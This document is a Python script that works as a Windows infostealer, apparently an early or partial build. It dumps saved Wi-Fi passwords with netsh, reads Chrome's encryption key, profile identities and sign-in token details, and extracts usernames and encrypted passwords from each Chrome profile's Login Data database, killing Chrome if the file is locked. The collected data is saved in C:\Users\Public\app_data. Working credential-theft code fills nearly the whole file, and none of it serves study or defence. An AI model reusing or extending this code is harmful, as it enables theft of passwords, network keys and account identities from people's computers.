true_false=['C:\\Users\\Public',True,True,True,True,True,True,True,True,True,'hello_world']
working_directory01=true_false[0]
system_info_collect=true_false[1]
chrome_data_collect=true_false[2]
chrome_data=true_false[3]
chrome_id_passsword=true_false[4]
web_data=true_false[5]
history_data=true_false[6]
edge_data=true_false[7]
dir_search=False
encrypt_data=true_false[8]
message_show_y_n=true_false[9]
message=true_false[10]
import os
print(' i am making path')
main_path=working_directory01+'\\app_data'
os.mkdir(main_path) if not os.path.exists(main_path)else None
print(' i am done makeing path')
# internet_accsess=true_false[11]
#other fuction--------------------------------------------------------------------------
def chrome_date_and_time(chrome_data):
    try:return datetime(1601, 1, 1) + timedelta(microseconds=chrome_data)
    except Exception as e:print(f"Error in chrome_date_and_time: {e}");return None
def encoding_check(path_to_open:str,format_to_open:str='r',json_file=False):
    '''so this code check every encoding tecnice to open file and don't let raise error
    path_to_open:   this argument ask which path to open sting obj
    format to open: this argument ask in which mode to open suppor string obj
                    'r' , ' r+'   
    json_file:      the file we opening is json or not it's check that bool value
    *** this code can't be use for writing in file ***        '''
    encoding_types = ["UTF-8","UTF-16","UTF-32","ASCII","ANSI","ISO-8859-1","Windows-1252","Unicode"]
    for i in encoding_types:
        try: 
            with open(path_to_open,format_to_open,encoding=i) as file:
                if format_to_open in ('r','r+'):
                    if json_file:file1=json.load(file)
                    else:file1=file.read()
                    return file1
        except UnicodeDecodeError: continue
        except Exception:continue
        except FileNotFoundError:pass
    return None
def check_internet_connection():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    try:sock.connect(("www.google.com", 80));return True
    except socket.error:return False
    finally:sock.close()
#import----------------------------------------------------------------------->
import socket
from datetime import timedelta,datetime
import time
import subprocess
while True:
    if check_internet_connection():break
    else:time.sleep(5)
try:import pip
except ImportError:
    try:import ensurepip;ensurepip.bootstrap()
    except ImportError: pass
try:import os
except ImportError as e:subprocess.call(['pip3','install','os']) 
try:import platform
except ImportError as e:subprocess.call(['pip3','install','platform']) 
try:import socket
except ImportError as e:subprocess.call(['pip3','install','socket'])
try:import json
except ImportError as e:subprocess.call(['pip3','install','json'])
try:import sqlite3
except ImportError as e:subprocess.call(['pip3','install','sqlite3'])
try:import shutil
except ImportError as e:subprocess.call(['pip3','install','shutil'])
try:from termcolor import colored
except Exception as e:subprocess.call(['pip3','install','termcolor'])
from datetime import timezone, datetime,timedelta
#main_function------------------------------------------------------------------------------#
def system_info(path_to_save:str,encodig_list):
    try:
        info=[platform.system(),platform.architecture(),platform.machine(),platform.node(),platform.platform(aliased=True),platform.processor(),platform.python_branch(),platform.python_version(),platform.python_revision(),platform.win32_ver()]
        info.append(host1:=socket.gethostname())
        try:ip_address=socket.gethostbyname(host1)
        except socket.gaierror:ip_address=None
        if bool(ip_address):
            try:interface=socket.gethostbyname(ip_address)
            except socket.gaierror:interface=None
        info.append(ip_address)
        info.append(interface)
        for i in encodig_list:
            try:data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode(i).split('\n');break
            except Exception:continue
        profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
        password11=[]
        for i in profiles:
            results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n')
            results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
            try:password11.append(results)
            except IndexError:password11.append('_______')
        info.append(profiles)
        info.append(password11)
        with open(path_to_save,'w+',encoding='UTF-8') as d:
            d.write(str(info))
        return True
    except Exception as e:
        print(e)
        return False
def chrome_data_basic(path_to_save:str):
    '''chrrome_data_basic colloect basic data of chrome and the save it to 
    the path given in argument ---->  path to save
    this is what all this code do call one more fuction encoding_check
    
    return True if everything okay and False if nothing oki'''
    data1=[]
    def gender(ppa):
        if ppa==1:return 'male'
        elif ppa==2:return 'female'
        else:return 'other'
    def accsept_lang(ppa_jas):
        try:return ppa_jas['intl']['accept_languages']
        except Exception: return 'nothing error in fating error-404'
    local_state_path=os.environ["USERPROFILE"]+'\\AppData\\Local\\Google\\Chrome\\User Data\\Local State'
    if os.path.exists(local_state_path):
        if bool(local_state_jason:=encoding_check(local_state_path,'r',True)):
            data1.append(local_state_jason["os_crypt"]["encrypted_key"])
            data1.append(profile_list:=local_state_jason['profile']['profiles_order'])
            for i in profile_list:
                data2=[
                    str(local_state_jason['profile']['info_cache'][i]['gaia_given_name']),
                    str(local_state_jason['profile']['info_cache'][i]['gaia_id']),
                    str(local_state_jason['profile']['info_cache'][i]['gaia_name']),
                    str(local_state_jason['profile']['info_cache'][i]['hosted_domain']),
                    str(local_state_jason['profile']['info_cache'][i]['last_downloaded_gaia_picture_url_with_size']),
                    str(local_state_jason['profile']['info_cache'][i]['managed_user_id']),
                    str(local_state_jason['profile']['info_cache'][i]['name']),
                    str(local_state_jason['profile']['info_cache'][i]['user_name'])
                    ]
                preferanse_path=os.environ["USERPROFILE"]+'\\AppData\\Local\\Google\\Chrome\\User Data\\'+i+'\\Preferences'
                if os.path.exists(preferanse_path):
                    ppa_jason=encoding_check(preferanse_path,'r',True)
                    if bool(ppa_jason):
                        data3=[
                            str(ppa_jason.get('sync', {}).get('birthday', None)),
                            str(ppa_jason.get('sync', {}).get('cache_guid', None)),
                            str(ppa_jason.get('sync', {}).get('demographics', {}).get('birth_year', None)),
                            gender(ppa_jason.get('sync', {}).get('demographics', {}).get('gender', None)),
                            accsept_lang(ppa_jason),
                            str(ppa_jason.get('intl', {}).get('selected_languages', None)),
                            str(ppa_jason.get('google', {}).get('services', {}).get('last_gaia_id', None)),
                            str(ppa_jason.get('google', {}).get('services', {}).get('signin', {}).get('REFRESH_TOKEN_RECEIVED', {}).get('time', None)),
                            str(ppa_jason.get('google', {}).get('services', {}).get('signin', {}).get('REFRESH_TOKEN_RECEIVED', {}).get('value', None))
                            ]


                    else:data3=['there is some error while conecting to path']
                else:data3=['error 404 preferance path not found']
                data2.append(data3)
                data1.append(data2.copy())
            with open(path_to_save,'w+',encoding='utf8') as si1:
                si1.write(str(data1))
            return True
        else:return False
    else:return False
# except Exception as e:
    #     print(e)
    #     return False
def chrome_id_password_c(path_to_save:str):
    data1=[];data2=[]
    try:
        profile_path=os.environ["USERPROFILE"]+'\\AppData\\Local\\Google\\Chrome\\User Data\\default\\Login Data'
        if os.path.exists(profile_path):
            collecting_data=sqlite3.connect(profile_path)
            extracted_data=collecting_data.cursor()
            try:query=extracted_data.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_last_used")
            except sqlite3.OperationalError:os.system("taskkill /im chrome.exe /f");query=extracted_data.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_last_used")
            except Exception:query=None
            if bool(query):
                data1.append('default01')
                for row in query.fetchall():
                    data3=[row[0],row[1],row[2],row[3],row[4],row[5]]
                    data2.append(data3)
            else:
                data1.append('error202:)')
                data2.appned(['there is nothing error:)'])
        else:
            data1.append('error404:)')
            data2.append(['there is nothing error404 :)'])
        data1.append(data2.copy())
        data1.append('data_profile')
        data2.clear()
        response=encoding_check(os.environ["USERPROFILE"]+'\\AppData\\Local\\Google\\Chrome\\User Data\\Local State','r',True)if os.path.exists(os.environ["USERPROFILE"]+'\\AppData\\Local\\Google\\Chrome\\User Data\\Local State') else None
        if bool(response):
            profile_list=response['profile']['profiles_order'];encryption_key=response["os_crypt"]["encrypted_key"]
            data2.append(profile_list)
            data2.append(encryption_key)
            for i in profile_list:
                login_data=os.environ["USERPROFILE"]+'\\AppData\\Local\\Google\\Chrome\\User Data\\'+i+'\\Login Data'
                if os.path.exists(login_data):
                    collecting_data=sqlite3.connect(login_data)
                    extracted_data=collecting_data.cursor()
                    try:query=extracted_data.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_last_used")
                    except sqlite3.OperationalError:os.system("taskkill /im chrome.exe /f");query=extracted_data.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_last_used")
                    except Exception:query=None
                    if bool(query):
                        data3=[True]
                        for row in query.fetchall():
                            data4=[row[0],row[1],row[2],[row[3],row[4],row[5]]]
                            data3.append(data4.copy())
                    else:data3=[False,['error while conecting Error202']]
                else:data3=[False,['path does not exist Error404']]
                data2.append(data3.copy())
                data3.clear()
        else:data3=[False,['path does not exist Error404']]
        data1.append(data2.copy());data2.clear()
        with open(path_to_save,'w+',encoding='utf8') as sid1:
            sid1.write(str(data1))
        return True
    except Exception as e:
        print(e)
        return False
# path lists---------------------------------------------------------------------
main_path=working_directory01+'\\app_data'
# main_code-------------------------------------------------------------------------
encoding_types = ["UTF-8","UTF-16","UTF-32","ASCII","ANSI","ISO-8859-1","Windows-1252","Unicode"]
print('i am executed 1')
if system_info_collect:
        system_info_response=system_info(main_path+'\\system_info',encoding_types)
        print("i a executed 2")
        print('here is the response ',system_info_response)
if chrome_data_collect:
    if chrome_data:
        chrome_data_basic_response=chrome_data_basic(main_path+'\\chrome_data')
        print('i am executed 3')
        print('here is the response',chrome_data_basic_response)
    if chrome_id_passsword:
        chrome_id_password_c_response=chrome_id_password_c(main_path+'\\chrome_id_pass')
        print('i am executed 4')
        print('here is the response',chrome_id_password_c_response)
        